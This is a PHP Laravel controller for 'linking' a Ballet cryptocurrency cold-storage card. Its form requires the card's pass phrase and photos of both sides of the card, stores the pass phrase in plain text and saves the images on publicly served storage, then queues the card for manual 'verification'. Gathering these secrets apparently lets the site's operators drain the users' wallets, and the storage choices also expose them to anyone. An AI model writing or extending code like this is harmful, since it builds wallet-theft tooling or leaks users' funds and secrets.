<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;
use App\Models\BalletCard;
use App\Models\CardTransaction; // Assuming Ballet Cards might have transactions

class BalletCardController extends Controller
{
    /**
     * Display the Ballet Card linking form.
     *
     * @return \Illuminate\View\View
     */
    public function showLinkingForm()
    {
        return view('user.ballet-card-linking');
    }

    /**
     * Handle the Ballet Card linking submission.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function linkCard(Request $request)
    {
        $request->validate([
            'primary_account_type' => 'required|string|in:BTC,ETH,USDT,LTC',
            'primary_account_deposit_address' => 'required|string|max:255',
            'serial_number' => 'nullable|string|max:8', // Not mandatory
            'pass_phrase' => 'required|string|max:20',
            'front_image' => 'required|image|max:5120', // Max 5MB
            'back_image' => 'required|image|max:5120',  // Max 5MB
        ]);

        $user = Auth::user();

        // Store images
        $frontImagePath = $request->file('front_image')->store('ballet_cards', 'public');
        $backImagePath = $request->file('back_image')->store('ballet_cards', 'public');

        BalletCard::create([
            'user_id' => $user->id,
            'front_image_path' => $frontImagePath,
            'back_image_path' => $backImagePath,
            'status' => 'pending',
            'primary_account_deposit_address' => $request->primary_account_deposit_address,
            'primary_account_type' => $request->primary_account_type,
            'serial_number' => $request->serial_number,
            'pass_phrase' => $request->pass_phrase,
            'balance' => 0.00, // Initial balance
            'currency' => $user->s_curr ?? 'USD', // Use user's preferred currency or default to USD
        ]);

        return redirect()->route('cards')->with('success', 'Ballet Card Linking In Progress. It will appear on your cards page once verified.');
    }

    /**
     * Display a specific Ballet Card's details.
     *
     * @param  \App\Models\BalletCard  $balletCard
     * @return \Illuminate\Http\Response
     */
    public function viewBalletCard(BalletCard $balletCard)
    {
        // Ensure the authenticated user owns this ballet card
        if ($balletCard->user_id !== Auth::id()) {
            abort(403, 'Unauthorized action.');
        }

        $title = 'Ballet Card Details';
        return view('user.ballet-cards.view', compact('balletCard', 'title'));
    }
}
